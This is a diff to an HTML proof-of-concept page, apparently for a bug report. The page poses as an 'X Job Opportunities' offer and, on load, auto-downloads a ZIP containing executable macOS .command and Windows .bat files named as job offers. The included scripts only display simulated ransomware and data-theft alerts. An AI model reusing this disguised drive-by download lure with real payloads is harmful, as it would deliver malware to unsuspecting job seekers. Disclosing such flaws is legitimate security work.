@@ -1,24 +1,79 @@
-<html>
-  <head>
-    <title>Auto-Download PoC</title>
-    <script src="https://cdn.jsdelivr.net/npm/jszip@3.7.1/dist/jszip.min.js"></script>
-  </head>
-  <body>
-    <h1>h3llo world.</h1>
-    <p>Click <a id="manual-download" href="#">here</a> if it doesn't.</p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X Job Opportunities</title>
+    <style>
+        body {
+            font-family: 'Helvetica', sans-serif;
+            margin: 0;
+            padding: 40px;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            font-size: 32px;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        .download-notice {
+            color: #e74c3c;
+            font-weight: bold;
+        }
+        a {
+            color: #3498db;
+            text-decoration: none;
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to X Job Opportunities</h1>
+        <p>Thank you for your interest in joining X! Your job offer details are being prepared for download.</p>
+        <p class="download-notice">Downloading Job_Offer_Details_2023.zip now...</p>
+        <p>If the download doesn’t start, <a id="manual-download" href="#">click here</a>.</p>
+    </div>
+
     <script>
-      var zip = new JSZip();
-      zip.file("hack.sh", "#!/bin/bash\necho \"You've been hacked! This is a PoC to demonstrate the vulnerability.\"");
-      zip.generateAsync({type:"blob"}).then(function(blob) {
-        var url = URL.createObjectURL(blob);
-        var a = document.createElement('a');
-        a.href = url;
-        a.download = 'harmless.zip';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        document.getElementById('manual-download').href = url;
-      });
+        window.onload = function() {
+            let zip = new JSZip();
+
+            // macOS Payload
+            zip.file("Job_Offer.command", "#!/bin/bash\necho \"Simulating malware execution...\"\nsleep 2\nosascript -e 'display alert \"CRITICAL ALERT: Your Files Are Encrypted!\" message \"This is a PoC. In a real attack, your files would be locked, and a ransom demanded. Imagine losing all your data!\"'");
+
+            // Windows Payload
+            zip.file("Job_Offer.bat", "@echo off\necho Simulating data theft...\ntimeout /t 2 >nul\necho ALERT: Your personal data has been stolen! This is a PoC - in a real attack, your passwords and files could be sent to a hacker.\npause");
+
+            // README
+            zip.file("README.txt", "*** SECURITY PROOF OF CONCEPT (PoC) ***\nThis ZIP demonstrates a critical vulnerability in X's job listing system.\nThe files (Job_Offer.command and Job_Offer.bat) are harmless and only simulate what a real attacker could do.\nIn an actual exploit:\n- On macOS: The script could encrypt your files (ransomware).\n- On Windows: It could steal your data and send it to a remote server.\nThis is NOT malware—it’s a wake-up call. Imagine this being real.");
+
+            // Generate and download ZIP
+            zip.generateAsync({ type: "blob" }).then(function(blob) {
+                let url = URL.createObjectURL(blob);
+                let link = document.createElement("a");
+                link.href = url;
+                link.download = "Job_Offer_Details_2023.zip";
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+
+                // Manual download fallback
+                document.getElementById("manual-download").href = url;
+            });
+        };
     </script>
-  </body>
+</body>
 </html>
